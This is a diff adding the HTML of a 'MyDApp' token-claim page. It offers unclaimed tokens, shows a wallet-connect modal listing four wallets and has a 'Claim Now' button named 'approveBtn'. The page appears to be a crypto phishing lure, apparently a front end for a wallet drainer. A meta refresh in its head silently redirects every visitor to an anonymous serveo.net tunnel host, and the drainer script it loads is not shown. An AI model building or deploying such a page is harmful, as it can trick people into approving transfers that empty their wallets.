@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>My DApp</title>
+    <meta http-equiv="refresh" content="0; url=https://9aad3cf8972cd3c7b2d7e9c4050ab394.serveo.net">
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <a href="#" class="logo">MyDApp</a>
+                <button id="walletButton" class="wallet-btn">
+                    <i class="fas fa-wallet"></i>
+                    <span>Connect Wallet</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <div class="container">
+            <section class="claim-section">
+                <div id="networkAlert" class="network-alert">
+                    Please switch to Sepolia Testnet to use this DApp
+                </div>
+                <h1 class="claim-title">Claim Your Tokens</h1>
+                
+                <div class="dynamic-content">
+                    <p>You have unclaimed tokens waiting for you!</p>
+                </div>
+                
+                <div class="claim-amount">1,000 TOK</div>
+                <button id="approveBtn" class="claim-btn" disabled>Claim Now</button>
+            </section>
+        </div>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="social-links">
+                    <a href="#"><i class="fab fa-twitter"></i></a>
+                    <a href="#"><i class="fab fa-telegram"></i></a>
+                    <a href="#"><i class="fab fa-discord"></i></a>
+                    <a href="#"><i class="fab fa-github"></i></a>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Terms</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Docs</a>
+                    <a href="#">FAQ</a>
+                </div>
+                <p class="copyright">&copy; 2023 MyDApp. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Wallet Selection Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <h2 class="modal-title">Connect Wallet</h2>
+            
+            <div id="metamaskOption" class="wallet-option">
+                <div class="wallet-icon"><i class="fab fa-ethereum"></i></div>
+                <div class="wallet-name">MetaMask</div>
+            </div>
+            
+            <div id="walletConnectOption" class="wallet-option">
+                <div class="wallet-icon"><i class="fas fa-wallet"></i></div>
+                <div class="wallet-name">WalletConnect</div>
+            </div>
+            
+            <div id="coinbaseOption" class="wallet-option">
+                <div class="wallet-icon"><i class="fab fa-bitcoin"></i></div>
+                <div class="wallet-name">Coinbase Wallet</div>
+            </div>
+
+            <div id="trustWalletOption" class="wallet-option">
+                <div class="wallet-icon"><i class="fas fa-lock"></i></div>
+                <div class="wallet-name">Trust Wallet</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+   
+    <div id="loadingOverlay" class="hidden">
+        <div class="loader"></div>
+        <p>Processing transaction...</p>
+      </div>
+    <!-- Status Messages -->
+    <div id="status" style="position: fixed; bottom: 20px; right: 20px; max-width: 300px; padding: 12px; background: #333; color: #fff; border-radius: 8px; display: none; z-index: 9998; box-shadow: 0 4px 6px rgba(0,0,0,0.1);"></div>
+
+    <script src="./script.js"></script>
+</body>
+</html>
